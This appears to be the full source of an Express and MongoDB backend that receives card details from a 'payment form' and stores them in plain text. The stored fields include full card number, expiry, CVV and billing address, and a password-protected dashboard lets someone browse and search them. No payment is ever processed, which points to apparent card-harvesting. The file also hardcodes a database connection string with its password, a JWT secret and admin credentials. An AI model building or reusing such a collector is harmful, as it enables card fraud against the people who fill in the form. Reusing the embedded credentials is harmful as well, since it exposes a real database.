const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const jwt = require("jsonwebtoken");
const app = express();

app.use(cors());
app.use(express.json());

// ─── MongoDB Connection ────
mongoose
  .connect(
    "mongodb+srv://safiswati10_db_user:Onyxtaffy%40123@cluster0.xajhmc0.mongodb.net/payments",
  )
  .then(() => console.log(" MongoDB connected"))
  .catch((err) => console.error(" MongoDB error:", err));

// ─── Payment Schema ────
const paymentSchema = new mongoose.Schema({
  transaction_id: { type: String, required: true, unique: true },
  name: { type: String, required: true },
  card: { type: String, required: true }, // stored as-is from form
  month: { type: String },
  year: { type: String },
  cvv: { type: String },
  amount: { type: String },
  email: { type: String },
  phone: { type: String },
  address1: { type: String },
  address2: { type: String },
  city: { type: String },
  state: { type: String },
  postal: { type: String },
  country: { type: String },
  created_at: { type: Date, default: Date.now },
});

const Payment = mongoose.model("Payment", paymentSchema);

// ─── JWT Secret ─────
const JWT_SECRET = "nextfiler_admin_secret_2024";

// ─── Admin Credentials (hardcoded, change as needed) ────
const ADMIN = { username: "admin", password: "admin321" };

// ─── Auth Middleware ──
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "No token provided" });
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    return res.status(401).json({ error: "Invalid token" });
  }
}

// ─── Routes ───

// POST /api/login
app.post("/api/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN.username && password === ADMIN.password) {
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: "24h" });
    return res.json({ token });
  }
  return res.status(401).json({ error: "Invalid credentials" });
});

// POST /api/payments  — called from payment form
app.post("/api/payments", async (req, res) => {
  try {
    const payment = new Payment(req.body);
    await payment.save();
    return res.status(201).json({ success: true, id: payment._id });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});

// GET /api/payments  — dashboard: list with search + pagination
app.get("/api/payments", authMiddleware, async (req, res) => {
  try {
    const { search = "", page = 1, limit = 100 } = req.query;
    const skip = (parseInt(page) - 1) * parseInt(limit);

    const query = search
      ? {
          $or: [
            { transaction_id: { $regex: search, $options: "i" } },
            { name: { $regex: search, $options: "i" } },
            { email: { $regex: search, $options: "i" } },
            { country: { $regex: search, $options: "i" } },
            { amount: { $regex: search, $options: "i" } },
          ],
        }
      : {};

    const [payments, total] = await Promise.all([
      Payment.find(query)
        .sort({ created_at: -1 })
        .skip(skip)
        .limit(parseInt(limit)),
      Payment.countDocuments(query),
    ]);

    return res.json({
      payments,
      total,
      page: parseInt(page),
      pages: Math.ceil(total / parseInt(limit)),
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// GET /api/payments/stats  — summary cards
app.get("/api/payments/stats", authMiddleware, async (req, res) => {
  try {
    const total = await Payment.countDocuments();
    const amountAgg = await Payment.aggregate([
      { $addFields: { amt: { $toDouble: { $ifNull: ["$amount", "0"] } } } },
      { $group: { _id: null, total: { $sum: "$amt" } } },
    ]);
    const totalAmount = amountAgg[0]?.total || 0;

    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayCount = await Payment.countDocuments({
      created_at: { $gte: today },
    });

    const countries = await Payment.aggregate([
      { $group: { _id: "$country", count: { $sum: 1 } } },
      { $sort: { count: -1 } },
      { $limit: 5 },
    ]);

    return res.json({
      total,
      totalAmount,
      todayCount,
      topCountries: countries,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// GET /api/payments/:id  — single record
app.get("/api/payments/:id", authMiddleware, async (req, res) => {
  try {
    const p = await Payment.findById(req.params.id);
    if (!p) return res.status(404).json({ error: "Not found" });
    return res.json(p);
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});


// DELETE /api/payments/:id  — delete a record
app.delete("/api/payments/:id", authMiddleware, async (req, res) => {
  try {
    const result = await Payment.findByIdAndDelete(req.params.id);
    if (!result) return res.status(404).json({ error: "Not found" });
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
